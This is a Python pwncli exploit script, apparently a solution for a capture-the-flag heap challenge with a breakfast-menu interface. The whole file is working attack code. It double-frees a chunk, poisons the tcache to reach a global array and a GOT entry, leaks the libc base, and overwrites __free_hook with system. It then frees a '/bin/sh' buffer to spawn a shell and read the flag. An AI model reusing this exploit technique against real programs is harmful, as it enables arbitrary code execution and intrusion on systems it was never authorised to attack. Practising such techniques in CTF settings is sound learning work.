#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def create(idx:int, size:int):
    p.sendlineafter("5.- Exit\n", "1")
    p.sendlineafter("Enter the position of breakfast\n", str(idx))
    p.sendlineafter("Enter the size in kcal.\n", str(size))


def modify(idx:int, data):
    p.sendlineafter("5.- Exit\n", "2")
    p.sendlineafter("Introduce the menu to ingredients\n", str(idx))
    p.sendafter("Enter the ingredients\n", data)


def view(idx:int, recvn:int=8):
    p.sendlineafter("5.- Exit\n", "3")
    p.sendlineafter("Enter the breakfast to see\n", str(idx))
    m = p.recvn(recvn)
    info(f"Get msg: {m}")
    return m

def delete(idx:int):
    p.sendlineafter("5.- Exit\n", "4")
    p.sendlineafter("Introduce the menu to delete\n", str(idx))


create(0, 0x60)
create(1, 0x10)

delete(0)
delete(0)

create(2, 0x60)
modify(2, p64(0x602040))

create(3, 0x60)
modify(3, p64(0x601FB0))

msg = view(3)

libc_base_addr = u64_ex(msg) - libc.sym['free']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

create(4, 0x60)

modify(4, p64(libc.sym['__free_hook']-0x8))

modify(0, b"/bin/sh\x00"+p64(libc.sym['system']))

delete(0)

get_flag_when_get_shell(p)


p.interactive()